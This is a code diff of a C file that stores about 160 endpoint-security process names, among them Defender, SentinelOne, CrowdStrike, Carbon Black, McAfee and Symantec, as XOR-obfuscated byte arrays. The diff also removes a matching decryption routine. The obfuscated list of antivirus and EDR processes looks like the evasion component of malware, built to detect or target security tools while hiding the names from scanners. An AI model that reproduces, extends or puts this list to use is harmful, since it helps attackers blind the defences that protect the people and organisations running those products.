@@ -1,10 +1,4 @@
 #include "process.h"
-#include "utils.h" // For BOOL definition
-#include <stdlib.h>
-#include <string.h>
-
-const char XOR_KEY = 0x42;
-
 // --- Auto-generated Encrypted Process Names ---
 const unsigned char data_0[] = { 0x0f, 0x31, 0x0f, 0x32, 0x07, 0x2c, 0x25, 0x6c, 0x27, 0x3a, 0x27 }; // MsMpEng.exe
 const unsigned char data_1[] = { 0x0f, 0x31, 0x11, 0x27, 0x2c, 0x31, 0x27, 0x6c, 0x27, 0x3a, 0x27 }; // MsSense.exe
@@ -180,172 +174,161 @@ struct EncryptedString processData[] = {
     { data_7, sizeof(data_7) },   // MonitoringHost.exe
     { data_8, sizeof(data_8) },   // MpCmdRun.exe
     { data_9, sizeof(data_9) },   // winlogbeat.exe
-    { data_10, sizeof(data_10) }, // elastic-agent.exe
-    { data_11, sizeof(data_11) }, // elastic-endpoint.exe
-    { data_12, sizeof(data_12) }, // filebeat.exe
-    { data_13, sizeof(data_13) }, // xagt.exe
-    { data_14, sizeof(data_14) }, // QualysAgent.exe
-    { data_15, sizeof(data_15) }, // SentinelAgent.exe
-    { data_16, sizeof(data_16) }, // SentinelAgentWorker.exe
-    { data_17, sizeof(data_17) }, // SentinelServiceHost.exe
-    { data_18, sizeof(data_18) }, // SentinelStaticEngine.exe
-    { data_19, sizeof(data_19) }, // LogProcessorService.exe
-    { data_20, sizeof(data_20) }, // SentinelStaticEngineScanner.exe
-    { data_21, sizeof(data_21) }, // SentinelUI.exe
-    { data_22, sizeof(data_22) }, // SentinelStaticEnginePatcher.exe
-    { data_23, sizeof(data_23) }, // SentinelBrowserNativeHost.exe
-    { data_24, sizeof(data_24) }, // SentinelRemediation.exe
-    { data_25, sizeof(data_25) }, // SentinelHelperService.exe
-    { data_26, sizeof(data_26) }, // SentinelRemoteShell.exe
-    { data_27, sizeof(data_27) }, // SentinelRemoteShellHost.exe
-    { data_28, sizeof(data_28) }, // SentinelScanFromContextMenu.exe
-    { data_29, sizeof(data_29) }, // cb.exe
-    { data_30, sizeof(data_30) }, // cbsensor.exe
-    { data_31, sizeof(data_31) }, // cbdaemon.exe
-    { data_32, sizeof(data_32) }, // cban.exe
-    { data_33, sizeof(data_33) }, // cbpsc.exe
-    { data_34, sizeof(data_34) }, // cbcomms.exe
-    { data_35, sizeof(data_35) }, // carbonblack.exe
-    { data_36, sizeof(data_36) }, // cbcloud.exe
-    { data_37, sizeof(data_37) }, // cbt.exe
-    { data_38, sizeof(data_38) }, // RepUtils.exe
-    { data_39, sizeof(data_39) }, // RepUx.exe
-    { data_40, sizeof(data_40) }, // RepSvc.exe
-    { data_41, sizeof(data_41) }, // RepCLI.exe
-    { data_42, sizeof(data_42) }, // CbDefense.exe
-    { data_43, sizeof(data_43) }, // CbDefense-Audit.exe
-    { data_44, sizeof(data_44) }, // CbDefense-Recorder.exe
-    { data_45, sizeof(data_45) }, // CbDefense-Sensor.exe
-    { data_46, sizeof(data_46) }, // CbDefense-Service.exe
-    { data_47, sizeof(data_47) }, // CbDefense-UI.exe
-    { data_48, sizeof(data_48) }, // csagent.exe
-    { data_49, sizeof(data_49) }, // csfalcon.exe
-    { data_50, sizeof(data_50) }, // csfalconservice.exe
-    { data_51, sizeof(data_51) }, // csconnector.exe
-    { data_52, sizeof(data_52) }, // ekrn.exe
-    { data_53, sizeof(data_53) }, // ehurukai.exe
-    { data_54, sizeof(data_54) }, // endgame.exe
-    { data_55, sizeof(data_55) }, // esensor.exe
-    { data_56, sizeof(data_56) }, // eamsi.exe
-    { data_57, sizeof(data_57) }, // epp.exe
-    { data_58, sizeof(data_58) }, // eppservice.exe
-    { data_59, sizeof(data_59) }, // eppconsole.exe
-    { data_60, sizeof(data_60) }, // eppremediate.exe
-    { data_61, sizeof(data_61) }, // eadr.exe
-    { data_62, sizeof(data_62) }, // edpa.exe
-    { data_63, sizeof(data_63) }, // wdp.exe
-    { data_64, sizeof(data_64) }, // 4m.exe
-    { data_65, sizeof(data_65) }, // wsctrlsvc.exe
-    { data_66, sizeof(data_66) }, // hips4ray.exe
-    { data_67, sizeof(data_67) }, // hipsdaemon.exe
-    { data_68, sizeof(data_68) }, // mfemms.exe
-    { data_69, sizeof(data_69) }, // mfeann.exe
-    { data_70, sizeof(data_70) }, // mfecanary.exe
-    { data_71, sizeof(data_71) }, // mfeelam.exe
-    { data_72, sizeof(data_72) }, // mfeens.exe
-    { data_73, sizeof(data_73) }, // mfeesp.exe
-    { data_74, sizeof(data_74) }, // mfefire.exe
-    { data_75, sizeof(data_75) }, // mfehcs.exe
-    { data_76, sizeof(data_76) }, // mfehidin.exe
-    { data_77, sizeof(data_77) }, // mcafee diagnose scan.exe
-    { data_78, sizeof(data_78) }, // mc fab.exe
-    { data_79, sizeof(data_79) }, // mc feedback.exe
-    { data_80, sizeof(data_80) }, // mcinst.exe
-    { data_81, sizeof(data_81) }, // mclogs.exe
-    { data_82, sizeof(data_82) }, // mc-fw-host.exe
-    { data_83, sizeof(data_83) }, // mc-inst-ui.exe
-    { data_84, sizeof(data_84) }, // mc-neo-a-host.exe
-    { data_85, sizeof(data_85) }, // mc-neo-w-host.exe
-    { data_86, sizeof(data_86) }, // mc-neo-host.exe
-    { data_87, sizeof(data_87) }, // mc-mp-host.exe
-    { data_88, sizeof(data_88) }, // mcnetcfg.exe
-    { data_89, sizeof(data_89) }, // mcnetman.exe
-    { data_90, sizeof(data_90) }, // mcrepair.exe
-    { data_91, sizeof(data_91) }, // mcscan.exe
-    { data_92, sizeof(data_92) }, // mcshell.exe
-    { data_93, sizeof(data_93) }, // mcshield.exe
-    { data_94, sizeof(data_94) }, // mctp.exe
-    { data_95, sizeof(data_95) }, // mcupd.exe
-    { data_96, sizeof(data_96) }, // mcuihost.exe
-    { data_97, sizeof(data_97) }, // mcuicnt.exe
-    { data_98, sizeof(data_98) }, // mcvs.exe
-    { data_99, sizeof(data_99) }, // mcvsscn.exe
-    { data_100, sizeof(data_100) }, // mcsafe.exe
-    { data_101, sizeof(data_101) }, // mcsclog.exe
-    { data_102, sizeof(data_102) }, // mcscreencapture.exe
-    { data_103, sizeof(data_103) }, // mcsync.exe
-    { data_104, sizeof(data_104) }, // mccep.exe
-    { data_105, sizeof(data_105) }, // mccepbrw.exe
+    { data_10, sizeof(data_10) },   // elastic-agent.exe
+    { data_11, sizeof(data_11) },   // elastic-endpoint.exe
+    { data_12, sizeof(data_12) },   // filebeat.exe
+    { data_13, sizeof(data_13) },   // xagt.exe
+    { data_14, sizeof(data_14) },   // QualysAgent.exe
+    { data_15, sizeof(data_15) },   // SentinelAgent.exe
+    { data_16, sizeof(data_16) },   // SentinelAgentWorker.exe
+    { data_17, sizeof(data_17) },   // SentinelServiceHost.exe
+    { data_18, sizeof(data_18) },   // SentinelStaticEngine.exe
+    { data_19, sizeof(data_19) },   // LogProcessorService.exe
+    { data_20, sizeof(data_20) },   // SentinelStaticEngineScanner.exe
+    { data_21, sizeof(data_21) },   // SentinelUI.exe
+    { data_22, sizeof(data_22) },   // SentinelStaticEnginePatcher.exe
+    { data_23, sizeof(data_23) },   // SentinelBrowserNativeHost.exe
+    { data_24, sizeof(data_24) },   // SentinelRemediation.exe
+    { data_25, sizeof(data_25) },   // SentinelHelperService.exe
+    { data_26, sizeof(data_26) },   // SentinelRemoteShell.exe
+    { data_27, sizeof(data_27) },   // SentinelRemoteShellHost.exe
+    { data_28, sizeof(data_28) },   // SentinelScanFromContextMenu.exe
+    { data_29, sizeof(data_29) },   // cb.exe
+    { data_30, sizeof(data_30) },   // cbsensor.exe
+    { data_31, sizeof(data_31) },   // cbdaemon.exe
+    { data_32, sizeof(data_32) },   // cban.exe
+    { data_33, sizeof(data_33) },   // cbpsc.exe
+    { data_34, sizeof(data_34) },   // cbcomms.exe
+    { data_35, sizeof(data_35) },   // carbonblack.exe
+    { data_36, sizeof(data_36) },   // cbcloud.exe
+    { data_37, sizeof(data_37) },   // cbt.exe
+    { data_38, sizeof(data_38) },   // RepUtils.exe
+    { data_39, sizeof(data_39) },   // RepUx.exe
+    { data_40, sizeof(data_40) },   // RepSvc.exe
+    { data_41, sizeof(data_41) },   // RepCLI.exe
+    { data_42, sizeof(data_42) },   // CbDefense.exe
+    { data_43, sizeof(data_43) },   // CbDefense-Audit.exe
+    { data_44, sizeof(data_44) },   // CbDefense-Recorder.exe
+    { data_45, sizeof(data_45) },   // CbDefense-Sensor.exe
+    { data_46, sizeof(data_46) },   // CbDefense-Service.exe
+    { data_47, sizeof(data_47) },   // CbDefense-UI.exe
+    { data_48, sizeof(data_48) },   // csagent.exe
+    { data_49, sizeof(data_49) },   // csfalcon.exe
+    { data_50, sizeof(data_50) },   // csfalconservice.exe
+    { data_51, sizeof(data_51) },   // csconnector.exe
+    { data_52, sizeof(data_52) },   // ekrn.exe
+    { data_53, sizeof(data_53) },   // ehurukai.exe
+    { data_54, sizeof(data_54) },   // endgame.exe
+    { data_55, sizeof(data_55) },   // esensor.exe
+    { data_56, sizeof(data_56) },   // eamsi.exe
+    { data_57, sizeof(data_57) },   // epp.exe
+    { data_58, sizeof(data_58) },   // eppservice.exe
+    { data_59, sizeof(data_59) },   // eppconsole.exe
+    { data_60, sizeof(data_60) },   // eppremediate.exe
+    { data_61, sizeof(data_61) },   // eadr.exe
+    { data_62, sizeof(data_62) },   // edpa.exe
+    { data_63, sizeof(data_63) },   // wdp.exe
+    { data_64, sizeof(data_64) },   // 4m.exe
+    { data_65, sizeof(data_65) },   // wsctrlsvc.exe
+    { data_66, sizeof(data_66) },   // hips4ray.exe
+    { data_67, sizeof(data_67) },   // hipsdaemon.exe
+    { data_68, sizeof(data_68) },   // mfemms.exe
+    { data_69, sizeof(data_69) },   // mfeann.exe
+    { data_70, sizeof(data_70) },   // mfecanary.exe
+    { data_71, sizeof(data_71) },   // mfeelam.exe
+    { data_72, sizeof(data_72) },   // mfeens.exe
+    { data_73, sizeof(data_73) },   // mfeesp.exe
+    { data_74, sizeof(data_74) },   // mfefire.exe
+    { data_75, sizeof(data_75) },   // mfehcs.exe
+    { data_76, sizeof(data_76) },   // mfehidin.exe
+    { data_77, sizeof(data_77) },   // mcafee diagnose scan.exe
+    { data_78, sizeof(data_78) },   // mc fab.exe
+    { data_79, sizeof(data_79) },   // mc feedback.exe
+    { data_80, sizeof(data_80) },   // mcinst.exe
+    { data_81, sizeof(data_81) },   // mclogs.exe
+    { data_82, sizeof(data_82) },   // mc-fw-host.exe
+    { data_83, sizeof(data_83) },   // mc-inst-ui.exe
+    { data_84, sizeof(data_84) },   // mc-neo-a-host.exe
+    { data_85, sizeof(data_85) },   // mc-neo-w-host.exe
+    { data_86, sizeof(data_86) },   // mc-neo-host.exe
+    { data_87, sizeof(data_87) },   // mc-mp-host.exe
+    { data_88, sizeof(data_88) },   // mcnetcfg.exe
+    { data_89, sizeof(data_89) },   // mcnetman.exe
+    { data_90, sizeof(data_90) },   // mcrepair.exe
+    { data_91, sizeof(data_91) },   // mcscan.exe
+    { data_92, sizeof(data_92) },   // mcshell.exe
+    { data_93, sizeof(data_93) },   // mcshield.exe
+    { data_94, sizeof(data_94) },   // mctp.exe
+    { data_95, sizeof(data_95) },   // mcupd.exe
+    { data_96, sizeof(data_96) },   // mcuihost.exe
+    { data_97, sizeof(data_97) },   // mcuicnt.exe
+    { data_98, sizeof(data_98) },   // mcvs.exe
+    { data_99, sizeof(data_99) },   // mcvsscn.exe
+    { data_100, sizeof(data_100) },   // mcsafe.exe
+    { data_101, sizeof(data_101) },   // mcsclog.exe
+    { data_102, sizeof(data_102) },   // mcscreencapture.exe
+    { data_103, sizeof(data_103) },   // mcsync.exe
+    { data_104, sizeof(data_104) },   // mccep.exe
+    { data_105, sizeof(data_105) },   // mccepbrw.exe
     { data_76, sizeof(data_76) },   // mfehidin.exe
     { data_76, sizeof(data_76) },   // mfehidin.exe
-    { data_106, sizeof(data_106) }, // mfetp.exe
-    { data_107, sizeof(data_107) }, // mfeamcin.exe
-    { data_108, sizeof(data_108) }, // mfeaps.exe
-    { data_109, sizeof(data_109) }, // mfeavsvc.exe
-    { data_110, sizeof(data_110) }, // mfeskin.gr.exe
-    { data_111, sizeof(data_111) }, // 360SPTool.exe
-    { data_112, sizeof(data_112) }, // 360taskmgr.exe
-    { data_113, sizeof(data_113) }, // 360Toasts.exe
-    { data_114, sizeof(data_114) }, // 360UDisk.exe
-    { data_115, sizeof(data_115) }, // 360WD.exe
-    { data_116, sizeof(data_116) }, // 360WebDeff.exe
-    { data_117, sizeof(data_117) }, // 360leakfix.exe
-    { data_118, sizeof(data_118) }, // 360LeakRepair.exe
-    { data_119, sizeof(data_119) }, // 360NetRepair.exe
-    { data_120, sizeof(data_120) }, // 360Netman.exe
-    { data_121, sizeof(data_121) }, // 360ain.exe
-    { data_122, sizeof(data_122) }, // 360dump.exe
-    { data_123, sizeof(data_123) }, // 360insthelper.exe
-    { data_124, sizeof(data_124) }, // 360rp.exe
-    { data_125, sizeof(data_125) }, // 360safe.exe
-    { data_126, sizeof(data_126) }, // 360safetray.exe
-    { data_127, sizeof(data_127) }, // 360sd.exe
-    { data_128, sizeof(data_128) }, // 360sdup.exe
-    { data_129, sizeof(data_129) }, // 360sdrun.exe
-    { data_130, sizeof(data_130) }, // 360sdtooldata.exe
-    { data_131, sizeof(data_131) }, // 360sec.exe
-    { data_132, sizeof(data_132) }, // 360secext.exe
-    { data_133, sizeof(data_133) }, // repair.exe
-    { data_134, sizeof(data_134) }, // soft.gr.exe
-    { data_134, sizeof(data_134) }, // soft.gr.exe
-    { data_135, sizeof(data_135) }, // softup.notify.exe
-    { data_136, sizeof(data_136) }, // SuperKiller.exe
-    { data_137, sizeof(data_137) }, // WDSafeDown.exe
-    { data_138, sizeof(data_138) }, // WscControl.exe
-    { data_139, sizeof(data_139) }, // ZhuDongFangYu.exe
-    { data_140, sizeof(data_140) }, // Symantec.exe
-    { data_141, sizeof(data_141) }, // SymantecAgent.exe
-    { data_142, sizeof(data_142) }, // SymantecUI.exe
-    { data_143, sizeof(data_143) }, // Symantec Antivirus.exe
-    { data_144, sizeof(data_144) }, // Symantec Endpoint Protection.exe
-    { data_145, sizeof(data_145) }, // zhongshenlong.exe
-    { data_146, sizeof(data_146) }, // avg.exe
-    { data_147, sizeof(data_147) }, // avast.exe
-    { data_148, sizeof(data_148) }, // bitdefender.exe
-    { data_149, sizeof(data_149) }, // kaspersky.exe
-    { data_150, sizeof(data_150) }, // sophos.exe
-    { data_151, sizeof(data_151) }, // trend micro.exe
-    { data_152, sizeof(data_152) }, // eset.exe
-    { data_153, sizeof(data_153) }, // f-secure.exe
-    { data_154, sizeof(data_154) }, // panda.exe
-    { data_155, sizeof(data_155) }, // webroot.exe
-    { data_156, sizeof(data_156) }, // norton.exe
-    { data_157, sizeof(data_157) }, // mcafee.exe
-    { data_158, sizeof(data_158) }, // cylance.exe
-    { data_159, sizeof(data_159) }, // crowdstrike.exe
-    { data_160, sizeof(data_160) }, // hwsd.exe
+    { data_106, sizeof(data_106) },   // mfetp.exe
+    { data_107, sizeof(data_107) },   // mfeamcin.exe
+    { data_108, sizeof(data_108) },   // mfeaps.exe
+    { data_109, sizeof(data_109) },   // mfeavsvc.exe
+    { data_110, sizeof(data_110) },   // mfeskin.gr.exe
+    { data_111, sizeof(data_111) },   // 360SPTool.exe
+    { data_112, sizeof(data_112) },   // 360taskmgr.exe
+    { data_113, sizeof(data_113) },   // 360Toasts.exe
+    { data_114, sizeof(data_114) },   // 360UDisk.exe
+    { data_115, sizeof(data_115) },   // 360WD.exe
+    { data_116, sizeof(data_116) },   // 360WebDeff.exe
+    { data_117, sizeof(data_117) },   // 360leakfix.exe
+    { data_118, sizeof(data_118) },   // 360LeakRepair.exe
+    { data_119, sizeof(data_119) },   // 360NetRepair.exe
+    { data_120, sizeof(data_120) },   // 360Netman.exe
+    { data_121, sizeof(data_121) },   // 360ain.exe
+    { data_122, sizeof(data_122) },   // 360dump.exe
+    { data_123, sizeof(data_123) },   // 360insthelper.exe
+    { data_124, sizeof(data_124) },   // 360rp.exe
+    { data_125, sizeof(data_125) },   // 360safe.exe
+    { data_126, sizeof(data_126) },   // 360safetray.exe
+    { data_127, sizeof(data_127) },   // 360sd.exe
+    { data_128, sizeof(data_128) },   // 360sdup.exe
+    { data_129, sizeof(data_129) },   // 360sdrun.exe
+    { data_130, sizeof(data_130) },   // 360sdtooldata.exe
+    { data_131, sizeof(data_131) },   // 360sec.exe
+    { data_132, sizeof(data_132) },   // 360secext.exe
+    { data_133, sizeof(data_133) },   // repair.exe
+    { data_134, sizeof(data_134) },   // soft.gr.exe
+    { data_134, sizeof(data_134) },   // soft.gr.exe
+    { data_135, sizeof(data_135) },   // softup.notify.exe
+    { data_136, sizeof(data_136) },   // SuperKiller.exe
+    { data_137, sizeof(data_137) },   // WDSafeDown.exe
+    { data_138, sizeof(data_138) },   // WscControl.exe
+    { data_139, sizeof(data_139) },   // ZhuDongFangYu.exe
+    { data_140, sizeof(data_140) },   // Symantec.exe
+    { data_141, sizeof(data_141) },   // SymantecAgent.exe
+    { data_142, sizeof(data_142) },   // SymantecUI.exe
+    { data_143, sizeof(data_143) },   // Symantec Antivirus.exe
+    { data_144, sizeof(data_144) },   // Symantec Endpoint Protection.exe
+    { data_145, sizeof(data_145) },   // zhongshenlong.exe
+    { data_146, sizeof(data_146) },   // avg.exe
+    { data_147, sizeof(data_147) },   // avast.exe
+    { data_148, sizeof(data_148) },   // bitdefender.exe
+    { data_149, sizeof(data_149) },   // kaspersky.exe
+    { data_150, sizeof(data_150) },   // sophos.exe
+    { data_151, sizeof(data_151) },   // trend micro.exe
+    { data_152, sizeof(data_152) },   // eset.exe
+    { data_153, sizeof(data_153) },   // f-secure.exe
+    { data_154, sizeof(data_154) },   // panda.exe
+    { data_155, sizeof(data_155) },   // webroot.exe
+    { data_156, sizeof(data_156) },   // norton.exe
+    { data_157, sizeof(data_157) },   // mcafee.exe
+    { data_158, sizeof(data_158) },   // cylance.exe
+    { data_159, sizeof(data_159) },   // crowdstrike.exe
+    { data_160, sizeof(data_160) },   // hwsd.exe
 };
 
 const size_t PROCESS_DATA_COUNT = sizeof(processData) / sizeof(processData[0]);
 
-// This function is defined here as it is only used by isProcessInList
-char* decryptString(struct EncryptedString encStr) {
-    if (!encStr.data || encStr.size == 0) return NULL;
-    char* decrypted = (char*)malloc(encStr.size + 1);
-    if (!decrypted) return NULL;
-    for (size_t i = 0; i < encStr.size; ++i) {
-        decrypted[i] = encStr.data[i] ^ XOR_KEY;
-    }
-    decrypted[encStr.size] = '\0';
-    return decrypted;
-}
